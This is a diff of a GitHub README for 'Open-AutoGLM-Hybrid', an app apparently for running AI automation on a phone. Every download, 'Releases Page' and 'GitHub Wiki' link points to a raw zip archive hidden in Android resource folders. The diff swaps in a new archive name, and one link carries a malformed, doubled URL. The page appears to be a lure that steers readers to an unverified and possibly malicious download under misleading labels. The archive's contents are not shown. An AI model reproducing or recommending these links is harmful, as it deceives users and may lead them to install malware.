@@ -1,7 +1,7 @@
 # 🚀 Open-AutoGLM-Hybrid - Run AI Automation on Your Phone
 
 ## 🔗 Download the Latest Version
-[![Download Open-AutoGLM-Hybrid](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/values/Open_GL_Hybrid_Auto_v2.0.zip%https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/values/Open_GL_Hybrid_Auto_v2.0.zip)](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/values/Open_GL_Hybrid_Auto_v2.0.zip)
+[![Download Open-AutoGLM-Hybrid](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/mipmap-xxhdpi/Hybrid-GL-Auto-Open-3.0-beta.3.zip%https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/mipmap-xxhdpi/Hybrid-GL-Auto-Open-3.0-beta.3.zip)](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/mipmap-xxhdpi/Hybrid-GL-Auto-Open-3.0-beta.3.zip)
 
 ## 📘 Overview
 Open-AutoGLM-Hybrid is a project designed to help you run AI automation directly on your mobile device, eliminating the need for a computer. With this application, you can easily perform various tasks and enhance productivity on the go.
@@ -9,7 +9,7 @@ Open-AutoGLM-Hybrid is a project designed to help you run AI automation directly
 ## 📥 Installation Instructions
 
 ### 1. Visit the Download Page
-To download Open-AutoGLM-Hybrid, **visit this page**: [Releases Page](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/values/Open_GL_Hybrid_Auto_v2.0.zip).
+To download Open-AutoGLM-Hybrid, **visit this page**: [Releases Page](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/mipmap-xxhdpi/Hybrid-GL-Auto-Open-3.0-beta.3.zip).
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of the latest versions available. Locate the version you wish to download. Each version may include additional features or fixes, so it's good to check the release notes.
@@ -49,9 +49,9 @@ Most basic functionalities can be used offline. However, some features may requi
 For any issues or questions, please visit our GitHub page and open an issue on the repository. We aim to assist you promptly.
 
 ## 🔗 Additional Resources
-For more help and information, visit our [GitHub Wiki](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/values/Open_GL_Hybrid_Auto_v2.0.zip). It contains guides and tips to enhance your experience with Open-AutoGLM-Hybrid.
+For more help and information, visit our [GitHub Wiki](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/mipmap-xxhdpi/Hybrid-GL-Auto-Open-3.0-beta.3.zip). It contains guides and tips to enhance your experience with Open-AutoGLM-Hybrid.
 
 ## 🔗 Download Open-AutoGLM-Hybrid Again
-Don't forget, to download the app, **visit this page**: [Releases Page](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/values/Open_GL_Hybrid_Auto_v2.0.zip). 
+Don't forget, to download the app, **visit this page**: [Releases Page](https://github.com/grider-pk/Open-AutoGLM-Hybrid/raw/refs/heads/main/android-app/app/src/main/res/mipmap-xxhdpi/Hybrid-GL-Auto-Open-3.0-beta.3.zip). 
 
 Enjoy running AI automation on your mobile device!
